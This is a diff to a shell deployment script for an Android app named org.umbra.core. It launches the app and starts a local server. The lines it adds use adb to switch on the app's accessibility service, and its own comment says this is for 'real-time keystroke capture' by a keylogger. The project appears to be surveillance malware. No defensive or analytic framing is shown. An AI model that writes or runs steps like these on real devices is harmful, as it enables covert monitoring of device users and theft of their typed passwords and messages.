@@ -32,6 +32,10 @@ done
 # LAUNCH
 adb shell am start -n org.umbra.core/.MainActivity
 
+# ENABLE KEYLOGGER ACCESSIBILITY SERVICE (required for real-time keystroke capture)
+adb shell settings put secure enabled_accessibility_services org.umbra.core/org.umbra.core.modules.UmbraAccessibilityService
+adb shell settings put secure accessibility_enabled 1
+
 # START SERVER (keep open)
 fuser -k 8443/tcp 2>/dev/null
 /tmp/umbra-server
